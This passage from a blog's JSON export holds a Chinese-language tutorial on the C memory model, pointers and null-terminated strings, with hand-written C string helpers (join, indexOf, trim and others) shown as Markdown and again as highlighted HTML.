若程序员不释放，程序结束时可能由OS回收。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。\n3 全局区：主要包括静态全局区和常量区，程序结束后由系统释放。\n静态区(static):全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域,未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。\n常量区:常量字符串就是放在这里的。\n4 代码区：存放函数体的二进制代码。\n示例:\n``` C\nchar*fa()\n{\n    char*pa = \"123456\";//pa指针在栈区，“123456”在常量区，该函数调用完后指针变量pa就被释放了\n    char*p = NULL;//指针变量p在栈中分配4字节\n    p=(char*)malloc(100);//本函数在这里开辟了一块堆区的内存空间，并把地址赋值给p\n    strcpy(p, \"wudunxiong 1234566\");//把常量区的字符串拷贝到堆区\n    return p;//返回给主调函数fb()，相对fa来说fb是主调函数，相对main来说，fa(),fb()都是被调用函数\n}\n```\n由此可以得知，当一个程序运行时，他的全局区，代码区基本是固定不变的，堆区与全局区和代码区均由系统控制。开发人员需对堆区内存进行管理。在现代开发语言(java,c#,javascript等)里,堆区内存管理都是由垃圾回收器处理的。\n\n## 内存管理基础:指针\n指针是一个变量,其值为另一个变量的地址,即内存位置的直接地址。就像其他变量或常量一样,您必须在使用指针存储其他变量地址之前,对其进行声明。指针变量声明的一般形式为：type *var-name;\n示例如下:\n``` C\n#include <stdio.h>\nint main ()\n{\n   int  var = 20;   /* 实际变量的声明 */\n   int  *ip;        /* 指针变量的声明 */\n   ip = &var;  /* 在指针变量中存储 var 的地址 */\n   printf(\"Address of var variable: %x\\n\", &var  );\n   /* 在指针变量中存储的地址 */\n   printf(\"Address stored in ip variable: %x\\n\", ip );\n   /* 使用指针访问值 */\n   printf(\"Value of *ip variable: %d\\n\", *ip );\n   return 0;\n}\n```\n## 字符串\n在C语言中,字符串实际上是使用null字符 '\\0' 终止的一维字符数组.因此,一个以null尾的字符串,包含了组成字符串的字符.\n下面的声明和初始化创建了一个\"Hello\"字符串.由于在数组的末尾存储了空字符,所以字符数组的大小比单词\"Hello\"的字符数多一个。\n![效果](/img/c-4.jpg)\n\nc语言标准库没有常用的字符串方法，如indexOf,lastIndexOf,trim,lTrim,rTrim等方法。如是我就自己尝试实现，中间用了几个标准库函数:strcpy字符串拷贝，strcat字符串连接，这个方法不能直接用，C中的字符串内存不是自动扩展需要自己申请,strcat是把第二个字符串copy到第一个字符串结尾，需要第一个字符串分配的内存足够多，不然无法连接。strstr查找相同的字符串，返回的又是地址。整个代码全是内存操作，自已申请的内存一定要记得释放，对于用惯了现代语言的人来说，这真是相当虐心啊。\n![效果](/img/c-5.jpg)\n还是看代码吧\n``` C\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h> \nint main(void)\n{\n    ///方法定义\n    char* join(char  *s1,char *s2);\n    int indexOf(char *str1,char *str2);\n    int lastIndexOf(char *str1,char *str2);\n    char* ltrim(char *str);\n    char* rtrim(char *str);\n    char* trim(char *str);\n    //测试数据准备\n    char *first;\n    char *second;\n    char *indexstr;\n    char *third;\n    char *show;\n    first = \"binyanbin website is \";\n    second = \"http://binyanbin.github.io\";\n    indexstr = \"bin\";\n    third = \"  binyanbin trim test \";\n    //测试结果输出\n    show = join(first,second);\n    printf(\"join(\\\"%s\\\",\\\"%s\\\")=\\\"%s\\\"\\n\",first,second,show);\n    free(show);\n    printf(\"indexOf(\\\"%s\\\",\\\"%s\\\")=%d\\n\",second,indexstr,indexOf(second,indexstr));\n    printf(\"lastIndexOf(\\\"%s\\\",\\\"%s\\\")=%d\\n\",second,indexstr,lastIndexOf(second,indexstr));\n    show = ltrim(third);\n    printf(\"ltrim(\\\"%s\\\")=\\\"%s\\\"\\n\",third,show);\n    free(show);\n    show = rtrim(third);\n    printf(\"rtrim(\\\"%s\\\")=\\\"%s\\\"\\n\",third,show);\n    show = trim(third);\n    printf(\"trim(\\\"%s\\\")=\\\"%s\\\"\",third,show);\n    free(show);\n}\n\n//字符串连接\nchar* join(char  *s1,char *s2)\n{\n    //分布内存\n    char *result = malloc(strlen(s1)+strlen(s2)+1);\n    if (result==NULL) \n        exit(0);//内存为空退出\n    //拷贝s1到result\n    strcpy(result, s1);\n    //s2加到result尾部  \n    strcat(result, s2);  \n    return result;  \n}\n//字符串查询最开始位置\nint indexOf(char *str1,char *str2)  \n{  \n    char *p=str1;  \n    int i=0;  \n    //p是一个地址，找到相同字符串的地址\n    p=strstr(str1,str2);  \n    if(p==NULL)  \n        return -1;  \n    else{  \n        //是不是同一个地址了，是同一地址则找到字符串\n        while(str1!=p)\n        {  \n            str1++;  \n            i++;  \n        }  \n    }  \n    return i;  \n} \n\n//查询最后位置\nint lastIndexOf(char *str1,char *str2)  \n{  \n    char *p=str1;  \n    int i=0;\n    int len=strlen(str2);  \n    p=strstr(str1,str2);  \n    if(p==NULL)return -1;\n    //未找到字符串地址为空则跳出循环  \n    while(p!=NULL)  \n    { \n        //跳过已找的地址 \n        for(;str1!=p;str1++)\n            i++;  \n        p=p+len;\n        //找出下一个同样字符串的地址  \n        p=strstr(p,str2);  \n    }  \n    return i;  \n} \n\n//删除左空格 \nchar* ltrim(char *param)  \n{\n    //申请存储，不修改参数内存的数据\n    char *str = malloc(strlen(param)+1); \n    strcpy(str, param); \n    int i=0,j,len=strlen(str);  \n    while(str[i]!='\\0')  \n    {\n        //32:空格,9:横向制表符\n        if(str[i]!=32&&str[i]!=9)\n            break;\n        i++;  \n    }  \n    if(i!=0)  \n    //将后面的字符顺势前移,补充删掉的空白位置\n    for(j=0;j<=len-i;j++)  \n    {     \n        str[j]=str[j+i];\n    }  \n    return str; \n}  \n//删除右空格\nchar* rtrim(char *param)  \n{\n    char *str = malloc(strlen(param)+1);    \n    strcpy(str, param); \n    char *p=str;  \n    int i=strlen(str)-1;  \n    while(i>=0)  \n    {  \n        if(p[i]!=32&&p[i]!=9)\n            break;  \n        i--;  \n    }  \n    str[++i]='\\0';\n    return str;  \n}\n//删除左右空格\nchar* trim(char *str)\n{\n    char* temp = ltrim(str);\n    char* result = rtrim(temp);\n    free(temp);\n    return result;\n}  \n```\n","slug":"c-3","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llso0005g2x6er39kh10","content":"<p>说起内存模型，那就先要介绍程序运行时是如何管理内存的。<br>程序运行时:</p>\n<ul>\n<li>系统先把物理硬盘代码load到内存</li>\n<li>系统再把c代码分成四个区</li>\n<li>系统再找到main函数入口执行<h2 id=\"程序的四区模型\"><a href=\"#程序的四区模型\" class=\"headerlink\" title=\"程序的四区模型\"></a>程序的四区模型</h2><img src=\"/img/c-3.png\" alt=\"效果\"><a id=\"more\"></a>\n一个由C编译的程序的内存分配通常由以下几块组成:<br>1 栈区(stack)由编译器自动分配释放,存放函数的参数值,局部变量的值等。其操作方式类似于数据结构中的栈。<br>2 堆区(heap):一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。<br>3 全局区：主要包括静态全局区和常量区，程序结束后由系统释放。<br>静态区(static):全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域,未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。<br>常量区:常量字符串就是放在这里的。<br>4 代码区：存放函数体的二进制代码。<br>示例:<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>*<span class=\"title\">fa</span><span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>*pa = <span class=\"string\">\"123456\"</span>;<span class=\"comment\">//pa指针在栈区，“123456”在常量区，该函数调用完后指针变量pa就被释放了</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span>*p = <span class=\"literal\">NULL</span>;<span class=\"comment\">//指针变量p在栈中分配4字节</span></span><br><span class=\"line\">    p=(<span class=\"keyword\">char</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">100</span>);<span class=\"comment\">//本函数在这里开辟了一块堆区的内存空间，并把地址赋值给p</span></span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(p, <span class=\"string\">\"wudunxiong 1234566\"</span>);<span class=\"comment\">//把常量区的字符串拷贝到堆区</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;<span class=\"comment\">//返回给主调函数fb()，相对fa来说fb是主调函数，相对main来说，fa(),fb()都是被调用函数</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>由此可以得知，当一个程序运行时，他的全局区，代码区基本是固定不变的，堆区与全局区和代码区均由系统控制。开发人员需对堆区内存进行管理。在现代开发语言(java,c#,javascript等)里,堆区内存管理都是由垃圾回收器处理的。</p>\n<h2 id=\"内存管理基础-指针\"><a href=\"#内存管理基础-指针\" class=\"headerlink\" title=\"内存管理基础:指针\"></a>内存管理基础:指针</h2><p>指针是一个变量,其值为另一个变量的地址,即内存位置的直接地址。就像其他变量或常量一样,您必须在使用指针存储其他变量地址之前,对其进行声明。指针变量声明的一般形式为：type *var-name;<br>示例如下:<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span> <span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">int</span>  var = <span class=\"number\">20</span>;   <span class=\"comment\">/* 实际变量的声明 */</span></span><br><span class=\"line\">   <span class=\"keyword\">int</span>  *ip;        <span class=\"comment\">/* 指针变量的声明 */</span></span><br><span class=\"line\">   ip = &amp;var;  <span class=\"comment\">/* 在指针变量中存储 var 的地址 */</span></span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">\"Address of var variable: %x\\n\"</span>, &amp;var  );</span><br><span class=\"line\">   <span class=\"comment\">/* 在指针变量中存储的地址 */</span></span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">\"Address stored in ip variable: %x\\n\"</span>, ip );</span><br><span class=\"line\">   <span class=\"comment\">/* 使用指针访问值 */</span></span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">\"Value of *ip variable: %d\\n\"</span>, *ip );</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"字符串\"><a href=\"#字符串\" class=\"headerlink\" title=\"字符串\"></a>字符串</h2><p>在C语言中,字符串实际上是使用null字符 ‘\\0’ 终止的一维字符数组.因此,一个以null尾的字符串,包含了组成字符串的字符.<br>下面的声明和初始化创建了一个”Hello”字符串.由于在数组的末尾存储了空字符,所以字符数组的大小比单词”Hello”的字符数多一个。<br><img src=\"/img/c-4.jpg\" alt=\"效果\"></p>\n<p>c语言标准库没有常用的字符串方法，如indexOf,lastIndexOf,trim,lTrim,rTrim等方法。如是我就自己尝试实现，中间用了几个标准库函数:strcpy字符串拷贝，strcat字符串连接，这个方法不能直接用，C中的字符串内存不是自动扩展需要自己申请,strcat是把第二个字符串copy到第一个字符串结尾，需要第一个字符串分配的内存足够多，不然无法连接。strstr查找相同的字符串，返回的又是地址。整个代码全是内存操作，自已申请的内存一定要记得释放，对于用惯了现代语言的人来说，这真是相当虐心啊。<br><img src=\"/img/c-5.jpg\" alt=\"效果\"><br>还是看代码吧<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span> </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">///方法定义</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">join</span><span class=\"params\">(<span class=\"keyword\">char</span>  *s1,<span class=\"keyword\">char</span> *s2)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">indexOf</span><span class=\"params\">(<span class=\"keyword\">char</span> *str1,<span class=\"keyword\">char</span> *str2)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">lastIndexOf</span><span class=\"params\">(<span class=\"keyword\">char</span> *str1,<span class=\"keyword\">char</span> *str2)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">ltrim</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">rtrim</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">trim</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">//测试数据准备</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *first;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *second;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *indexstr;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *third;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *show;</span><br><span class=\"line\">    first = <span class=\"string\">\"binyanbin website is \"</span>;</span><br><span class=\"line\">    second = <span class=\"string\">\"http://binyanbin.github.io\"</span>;</span><br><span class=\"line\">    indexstr = <span class=\"string\">\"bin\"</span>;</span><br><span class=\"line\">    third = <span class=\"string\">\"  binyanbin trim test \"</span>;</span><br><span class=\"line\">    <span class=\"comment\">//测试结果输出</span></span><br><span class=\"line\">    show = join(first,second);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"join(\\\"%s\\\",\\\"%s\\\")=\\\"%s\\\"\\n\"</span>,first,second,show);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(show);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"indexOf(\\\"%s\\\",\\\"%s\\\")=%d\\n\"</span>,second,indexstr,indexOf(second,indexstr));</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"lastIndexOf(\\\"%s\\\",\\\"%s\\\")=%d\\n\"</span>,second,indexstr,lastIndexOf(second,indexstr));</span><br><span class=\"line\">    show = ltrim(third);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"ltrim(\\\"%s\\\")=\\\"%s\\\"\\n\"</span>,third,show);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(show);</span><br><span class=\"line\">    show = rtrim(third);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"rtrim(\\\"%s\\\")=\\\"%s\\\"\\n\"</span>,third,show);</span><br><span class=\"line\">    show = trim(third);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"trim(\\\"%s\\\")=\\\"%s\\\"\"</span>,third,show);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(show);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//字符串连接</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">join</span><span class=\"params\">(<span class=\"keyword\">char</span>  *s1,<span class=\"keyword\">char</span> *s2)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//分布内存</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *result = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">strlen</span>(s1)+<span class=\"built_in\">strlen</span>(s2)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (result==<span class=\"literal\">NULL</span>) </span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);<span class=\"comment\">//内存为空退出</span></span><br><span class=\"line\">    <span class=\"comment\">//拷贝s1到result</span></span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(result, s1);</span><br><span class=\"line\">    <span class=\"comment\">//s2加到result尾部  </span></span><br><span class=\"line\">    <span class=\"built_in\">strcat</span>(result, s2);  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//字符串查询最开始位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">indexOf</span><span class=\"params\">(<span class=\"keyword\">char</span> *str1,<span class=\"keyword\">char</span> *str2)</span>  </span><br><span class=\"line\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">char</span> *p=str1;  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;  </span><br><span class=\"line\">    <span class=\"comment\">//p是一个地址，找到相同字符串的地址</span></span><br><span class=\"line\">    p=<span class=\"built_in\">strstr</span>(str1,str2);  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(p==<span class=\"literal\">NULL</span>)  </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">        <span class=\"comment\">//是不是同一个地址了，是同一地址则找到字符串</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(str1!=p)</span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">            str1++;  </span><br><span class=\"line\">            i++;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;  </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//查询最后位置</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">lastIndexOf</span><span class=\"params\">(<span class=\"keyword\">char</span> *str1,<span class=\"keyword\">char</span> *str2)</span>  </span><br><span class=\"line\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">char</span> *p=str1;  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> len=<span class=\"built_in\">strlen</span>(str2);  </span><br><span class=\"line\">    p=<span class=\"built_in\">strstr</span>(str1,str2);  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(p==<span class=\"literal\">NULL</span>)<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"comment\">//未找到字符串地址为空则跳出循环  </span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(p!=<span class=\"literal\">NULL</span>)  </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"comment\">//跳过已找的地址 </span></span><br><span class=\"line\">        <span class=\"keyword\">for</span>(;str1!=p;str1++)</span><br><span class=\"line\">            i++;  </span><br><span class=\"line\">        p=p+len;</span><br><span class=\"line\">        <span class=\"comment\">//找出下一个同样字符串的地址  </span></span><br><span class=\"line\">        p=<span class=\"built_in\">strstr</span>(p,str2);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;  </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//删除左空格 </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">ltrim</span><span class=\"params\">(<span class=\"keyword\">char</span> *param)</span>  </span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//申请存储，不修改参数内存的数据</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *str = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">strlen</span>(param)+<span class=\"number\">1</span>); </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(str, param); </span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j,len=<span class=\"built_in\">strlen</span>(str);  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(str[i]!=<span class=\"string\">'\\0'</span>)  </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">//32:空格,9:横向制表符</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(str[i]!=<span class=\"number\">32</span>&amp;&amp;str[i]!=<span class=\"number\">9</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        i++;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(i!=<span class=\"number\">0</span>)  </span><br><span class=\"line\">    <span class=\"comment\">//将后面的字符顺势前移,补充删掉的空白位置</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;=len-i;j++)  </span><br><span class=\"line\">    &#123;     </span><br><span class=\"line\">        str[j]=str[j+i];</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> str; </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"comment\">//删除右空格</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">rtrim</span><span class=\"params\">(<span class=\"keyword\">char</span> *param)</span>  </span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *str = <span class=\"built_in\">malloc</span>(<span class=\"built_in\">strlen</span>(param)+<span class=\"number\">1</span>);    </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(str, param); </span><br><span class=\"line\">    <span class=\"keyword\">char</span> *p=str;  </span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"built_in\">strlen</span>(str)<span class=\"number\">-1</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(i&gt;=<span class=\"number\">0</span>)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(p[i]!=<span class=\"number\">32</span>&amp;&amp;p[i]!=<span class=\"number\">9</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;  </span><br><span class=\"line\">        i--;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    str[++i]=<span class=\"string\">'\\0'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//删除左右空格</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">trim</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* temp = ltrim(str);</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* result = rtrim(temp);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(temp);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>说起内存模型，那就先要介绍程序运行时是如何管理内存的。<br>程序运行时:</p>\n<ul>\n<li>系统先把物理硬盘代码load到内存</li>\n<li>系统再把c代码分成四个区</li>\n<li>系统再找到main函数入口执行<h2 id=\"程序的四区模型\"><a href=\"#程序的四区模型\" class=\"headerlink\" title=\"程序的四区模型\"></a>程序的四区模型</h2><img src=\"/img/c-3.png\" alt=\"效果\">","more":"一个由C编译的程序的内存分配通常由以下几块组成:<br>1 栈区(stack)由编译器自动分配释放,存放函数的参数值,局部变量的值等。其操作方式类似于数据结构中的栈。<br>2 堆区(heap):一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。<br>3 全局区：主要包括静态全局区和常量区，程序结束后由系统释放。<br>静态区(static):全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域,未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。<br>常量区:常量字符串就是放在这里的。<br>4 代码区：存放函数体的二进制代码。<br>示例:<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>*<span class=\"title\">fa</span><span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>*pa = <span 